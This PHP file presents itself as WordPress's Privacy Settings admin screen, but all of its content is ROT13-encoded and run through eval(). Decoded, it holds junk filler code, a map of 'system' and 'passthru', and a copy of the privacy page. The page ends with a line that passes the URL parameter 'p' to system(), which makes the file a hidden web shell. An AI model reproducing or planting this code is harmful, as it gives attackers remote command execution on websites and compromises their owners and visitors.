<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cevinpl Frggvatf Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_cevinpl_bcgvbaf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb znantr cevinpl bcgvbaf ba guvf fvgr.' ) );
}

vs ( vffrg( $_TRG['gno'] ) && 'cbyvplthvqr' === $_TRG['gno'] ) {
	erdhver_bapr __QVE__ . '/cevinpl-cbyvpl-thvqr.cuc';
	erghea;
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr = __( 'Cevinpl' );

nqq_svygre(
	'nqzva_obql_pynff',
	fgngvp shapgvba ( $obql_pynff ) {
		$obql_pynff .= ' cevinpl-frggvatf ';

		erghea $obql_pynff;
	}
);

$npgvba = vffrg( $_CBFG['npgvba'] ) ? $_CBFG['npgvba'] : '';

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
				'<c>' . __( 'Gur Cevinpl fperra yrgf lbh rvgure ohvyq n arj cevinpl-cbyvpl cntr be pubbfr bar lbh nyernql unir gb fubj.' ) . '</c>' .
				'<c>' . __( 'Guvf fperra vapyhqrf fhttrfgvbaf gb uryc lbh jevgr lbhe bja cevinpl cbyvpl. Ubjrire, vg vf lbhe erfcbafvovyvgl gb hfr gurfr erfbheprf pbeerpgyl, gb cebivqr gur vasbezngvba erdhverq ol lbhe cevinpl cbyvpl, naq gb xrrc guvf vasbezngvba pheerag naq npphengr.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/frggvatf-cevinpl-fperra/\">Qbphzragngvba ba Cevinpl Frggvatf</n>' ) . '</c>'
);

vs ( ! rzcgl( $npgvba ) ) {
	purpx_nqzva_ersrere( $npgvba );

	vs ( 'frg-cevinpl-cntr' === $npgvba ) {
		$cevinpl_cbyvpl_cntr_vq = vffrg( $_CBFG['cntr_sbe_cevinpl_cbyvpl'] ) ? (vag) $_CBFG['cntr_sbe_cevinpl_cbyvpl'] : 0;
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $cevinpl_cbyvpl_cntr_vq );

		$cevinpl_cntr_hcqngrq_zrffntr = __( 'Cevinpl Cbyvpl cntr hcqngrq fhpprffshyyl.' );

		vs ( $cevinpl_cbyvpl_cntr_vq ) {
			/*
			 * Qba'g nyjnlf yvax gb gur zrah phfgbzvmre:
			 *
			 * - Hachoyvfurq cntrf pna'g or fryrpgrq ol qrsnhyg.
			 * - `JC_Phfgbzvmr_Ani_Zrahf::__pbafgehpg()` purpxf gur hfre'f pncnovyvgvrf.
			 * - Gurzrf zvtug abg \"bssvpvnyyl\" fhccbeg zrahf.
			 */
			vs (
				'choyvfu' === trg_cbfg_fgnghf( $cevinpl_cbyvpl_cntr_vq )
				&& pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' )
				&& pheerag_gurzr_fhccbegf( 'zrahf' )
			) {
				$cevinpl_cntr_hcqngrq_zrffntr = fcevags(
					/* genafyngbef: %f: HEY gb Phfgbzvmre -> Zrahf. */
					__( 'Cevinpl Cbyvpl cntr frggvat hcqngrq fhpprffshyyl. Erzrzore gb <n uers=\"%f\">hcqngr lbhe zrahf</n>!' ),
					rfp_hey( nqq_dhrel_net( 'nhgbsbphf[cnary]', 'ani_zrahf', nqzva_hey( 'phfgbzvmr.cuc' ) ) )
				);
			}
		}

		nqq_frggvatf_reebe( 'cntr_sbe_cevinpl_cbyvpl', 'cntr_sbe_cevinpl_cbyvpl', $cevinpl_cntr_hcqngrq_zrffntr, 'fhpprff' );
	} ryfrvs ( 'perngr-cevinpl-cntr' === $npgvba ) {

		vs ( ! pynff_rkvfgf( 'JC_Cevinpl_Cbyvpl_Pbagrag' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-cevinpl-cbyvpl-pbagrag.cuc';
		}

		$cevinpl_cbyvpl_cntr_pbagrag = JC_Cevinpl_Cbyvpl_Pbagrag::trg_qrsnhyg_pbagrag();
		$cevinpl_cbyvpl_cntr_vq      = jc_vafreg_cbfg(
			neenl(
				'cbfg_gvgyr'   => __( 'Cevinpl Cbyvpl' ),
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_glcr'    => 'cntr',
				'cbfg_pbagrag' => $cevinpl_cbyvpl_cntr_pbagrag,
			),
			gehr
		);

		vs ( vf_jc_reebe( $cevinpl_cbyvpl_cntr_vq ) ) {
			nqq_frggvatf_reebe(
				'cntr_sbe_cevinpl_cbyvpl',
				'cntr_sbe_cevinpl_cbyvpl',
				__( 'Hanoyr gb perngr n Cevinpl Cbyvpl cntr.' ),
				'reebe'
			);
		} ryfr {
			hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $cevinpl_cbyvpl_cntr_vq );

			jc_erqverpg( nqzva_hey( 'cbfg.cuc?cbfg=' . $cevinpl_cbyvpl_cntr_vq . '&npgvba=rqvg' ) );
			rkvg;
		}
	}
}

// Vs n Cevinpl Cbyvpl cntr VQ vf ninvynoyr, znxr fher gur cntr npghnyyl rkvfgf. Vs abg, qvfcynl na reebe.
$cevinpl_cbyvpl_cntr_rkvfgf = snyfr;
$cevinpl_cbyvpl_cntr_vq     = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

vs ( ! rzcgl( $cevinpl_cbyvpl_cntr_vq ) ) {

	$cevinpl_cbyvpl_cntr = trg_cbfg( $cevinpl_cbyvpl_cntr_vq );

	vs ( ! $cevinpl_cbyvpl_cntr vafgnaprbs JC_Cbfg ) {
		nqq_frggvatf_reebe(
			'cntr_sbe_cevinpl_cbyvpl',
			'cntr_sbe_cevinpl_cbyvpl',
			__( 'Gur pheeragyl fryrpgrq Cevinpl Cbyvpl cntr qbrf abg rkvfg. Cyrnfr perngr be fryrpg n arj cntr.' ),
			'reebe'
		);
	} ryfr {
		vs ( 'genfu' === $cevinpl_cbyvpl_cntr->cbfg_fgnghf ) {
			nqq_frggvatf_reebe(
				'cntr_sbe_cevinpl_cbyvpl',
				'cntr_sbe_cevinpl_cbyvpl',
				fcevags(
					/* genafyngbef: %f: HEY gb Cntrf Genfu. */
					__( 'Gur pheeragyl fryrpgrq Cevinpl Cbyvpl cntr vf va gur Genfu. Cyrnfr perngr be fryrpg n arj Cevinpl Cbyvpl cntr be <n uers=\"%f\">erfgber gur pheerag cntr</n>.' ),
					'rqvg.cuc?cbfg_fgnghf=genfu&cbfg_glcr=cntr'
				),
				'reebe'
			);
		} ryfr {
			$cevinpl_cbyvpl_cntr_rkvfgf = gehr;
		}
	}
}

$cnerag_svyr = 'bcgvbaf-trareny.cuc';

jc_radhrhr_fpevcg( 'cevinpl-gbbyf' );

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>
<qvi pynff=\"cevinpl-frggvatf-urnqre\">
	<qvi pynff=\"cevinpl-frggvatf-gvgyr-frpgvba\">
		<u1>
			<?cuc _r( 'Cevinpl' ); ?>
		</u1>
	</qvi>

	<ani pynff=\"cevinpl-frggvatf-gnof-jenccre uvqr-vs-ab-wf\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Frpbaqnel zrah' ); ?>\">
		<n uers=\"<?cuc rpub rfp_hey( nqzva_hey( 'bcgvbaf-cevinpl.cuc' ) ); ?>\" pynff=\"cevinpl-frggvatf-gno npgvir\" nevn-pheerag=\"gehr\">
			<?cuc
			/* genafyngbef: Gno urnqvat sbe Fvgr Urnygu Fgnghf cntr. */
			_rk( 'Frggvatf', 'Cevinpl Frggvatf' );
			?>
		</n>

		<n uers=\"<?cuc rpub rfp_hey( nqzva_hey( 'bcgvbaf-cevinpl.cuc?gno=cbyvplthvqr' ) ); ?>\" pynff=\"cevinpl-frggvatf-gno\">
			<?cuc
			/* genafyngbef: Gno urnqvat sbe Fvgr Urnygu Fgnghf cntr. */
			_rk( 'Cbyvpl Thvqr', 'Cevinpl Frggvatf' );
			?>
		</n>
	</ani>
</qvi>

<ue pynff=\"jc-urnqre-raq\">

<?cuc
jc_nqzva_abgvpr(
	__( 'Gur Cevinpl Frggvatf erdhver WninFpevcg.' ),
	neenl(
		'glcr'               => 'reebe',
		'nqqvgvbany_pynffrf' => neenl( 'uvqr-vs-wf' ),
	)
);
?>

<qvi pynff=\"cevinpl-frggvatf-obql uvqr-vs-ab-wf\">
	<u2><?cuc _r( 'Cevinpl Frggvatf' ); ?></u2>
	<c>
		<?cuc _r( 'Nf n jrofvgr bjare, lbh znl arrq gb sbyybj angvbany be vagreangvbany cevinpl ynjf. Sbe rknzcyr, lbh znl arrq gb perngr naq qvfcynl n cevinpl cbyvpl.' ); ?>
		<?cuc _r( 'Vs lbh nyernql unir n Cevinpl Cbyvpl cntr, cyrnfr fryrpg vg orybj. Vs abg, cyrnfr perngr bar.' ); ?>
	</c>
	<c>
		<?cuc _r( 'Gur arj cntr jvyy vapyhqr uryc naq fhttrfgvbaf sbe lbhe cevinpl cbyvpl.' ); ?>
		<?cuc _r( 'Ubjrire, vg vf lbhe erfcbafvovyvgl gb hfr gubfr erfbheprf pbeerpgyl, gb cebivqr gur vasbezngvba gung lbhe cevinpl cbyvpl erdhverf, naq gb xrrc gung vasbezngvba pheerag naq npphengr.' ); ?>
	</c>
	<c>
		<?cuc _r( 'Nsgre lbhe Cevinpl Cbyvpl cntr vf frg, lbh fubhyq rqvg vg.' ); ?>
		<?cuc _r( 'Lbh fubhyq nyfb erivrj lbhe cevinpl cbyvpl sebz gvzr gb gvzr, rfcrpvnyyl nsgre vafgnyyvat be hcqngvat nal gurzrf be cyhtvaf. Gurer znl or punatrf be arj fhttrfgrq vasbezngvba sbe lbh gb pbafvqre nqqvat gb lbhe cbyvpl.' ); ?>
	</c>
	<c>
		<?cuc
		vs ( $cevinpl_cbyvpl_cntr_rkvfgf ) {
			$rqvg_uers = nqq_dhrel_net(
				neenl(
					'cbfg'   => $cevinpl_cbyvpl_cntr_vq,
					'npgvba' => 'rqvg',
				),
				nqzva_hey( 'cbfg.cuc' )
			);
			$ivrj_uers = trg_creznyvax( $cevinpl_cbyvpl_cntr_vq );
			?>
				<fgebat>
				<?cuc
				vs ( 'choyvfu' === trg_cbfg_fgnghf( $cevinpl_cbyvpl_cntr_vq ) ) {
					cevags(
						/* genafyngbef: 1: HEY gb rqvg Cevinpl Cbyvpl cntr, 2: HEY gb ivrj Cevinpl Cbyvpl cntr. */
						__( '<n uers=\"%1$f\">Rqvg</n> be <n uers=\"%2$f\">ivrj</n> lbhe Cevinpl Cbyvpl cntr pbagrag.' ),
						rfp_hey( $rqvg_uers ),
						rfp_hey( $ivrj_uers )
					);
				} ryfr {
					cevags(
						/* genafyngbef: 1: HEY gb rqvg Cevinpl Cbyvpl cntr, 2: HEY gb cerivrj Cevinpl Cbyvpl cntr. */
						__( '<n uers=\"%1$f\">Rqvg</n> be <n uers=\"%2$f\">cerivrj</n> lbhe Cevinpl Cbyvpl cntr pbagrag.' ),
						rfp_hey( $rqvg_uers ),
						rfp_hey( $ivrj_uers )
					);
				}
				?>
				</fgebat>
			<?cuc
		}
		cevags(
			/* genafyngbef: 1: Cevinpl Cbyvpl thvqr HEY, 2: Nqqvgvbany yvax nggevohgrf, 3: Npprffvovyvgl grkg. */
			__( 'Arrq uryc chggvat gbtrgure lbhe arj Cevinpl Cbyvpl cntr? <n uers=\"%1$f\" %2$f>Purpx bhg gur cevinpl cbyvpl thvqr%3$f</n> sbe erpbzzraqngvbaf ba jung pbagrag gb vapyhqr, nybat jvgu cbyvpvrf fhttrfgrq ol lbhe cyhtvaf naq gurzr.' ),
			rfp_hey( nqzva_hey( 'bcgvbaf-cevinpl.cuc?gno=cbyvplthvqr' ) ),
			'',
			''
		);
		?>
	</c>
	<ue>
	<?cuc
	$unf_cntrf = (obby) trg_cbfgf(
		neenl(
			'cbfg_glcr'      => 'cntr',
			'cbfgf_cre_cntr' => 1,
			'cbfg_fgnghf'    => neenl(
				'choyvfu',
				'qensg',
			),
		)
	);
	?>
	<gnoyr pynff=\"sbez-gnoyr gbbyf-cevinpl-cbyvpl-cntr\" ebyr=\"cerfragngvba\">
		<ge>
			<gu fpbcr=\"ebj\">
				<ynory sbe=\"perngr-cntr\">
				<?cuc
				vs ( $unf_cntrf ) {
					_r( 'Perngr n arj Cevinpl Cbyvpl cntr' );
				} ryfr {
					_r( 'Gurer ner ab cntrf.' );
				}
				?>
				</ynory>
			</gu>
			<gq>
				<sbez pynff=\"jc-perngr-cevinpl-cntr\" zrgubq=\"cbfg\">
					<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"perngr-cevinpl-cntr\" />
					<?cuc
					jc_abapr_svryq( 'perngr-cevinpl-cntr' );
					fhozvg_ohggba( __( 'Perngr' ), 'frpbaqnel', 'fhozvg', snyfr, neenl( 'vq' => 'perngr-cntr' ) );
					?>
				</sbez>
			</gq>
		</ge>
		<?cuc vs ( $unf_cntrf ) : ?>
		<ge>
			<gu fpbcr=\"ebj\">
				<ynory sbe=\"cntr_sbe_cevinpl_cbyvpl\">
					<?cuc
					vs ( $cevinpl_cbyvpl_cntr_rkvfgf ) {
						_r( 'Punatr lbhe Cevinpl Cbyvpl cntr' );
					} ryfr {
						_r( 'Fryrpg n Cevinpl Cbyvpl cntr' );
					}
					?>
				</ynory>
			</gu>
			<gq>
				<sbez zrgubq=\"cbfg\">
					<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"frg-cevinpl-cntr\" />
					<?cuc
					jc_qebcqbja_cntrf(
						neenl(
							'anzr'              => 'cntr_sbe_cevinpl_cbyvpl',
							'fubj_bcgvba_abar'  => __( '&zqnfu; Fryrpg &zqnfu;' ),
							'bcgvba_abar_inyhr' => '0',
							'fryrpgrq'          => $cevinpl_cbyvpl_cntr_vq,
							'cbfg_fgnghf'       => neenl( 'qensg', 'choyvfu' ),
						)
					);

					jc_abapr_svryq( 'frg-cevinpl-cntr' );

					fhozvg_ohggba( __( 'Hfr Guvf Cntr' ), 'cevznel', 'fhozvg', snyfr, neenl( 'vq' => 'frg-cntr' ) );
					?>
				</sbez>
			</gq>
		</ge>
		<?cuc raqvs; ?>
	</gnoyr>
</qvi>
<?cuc

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>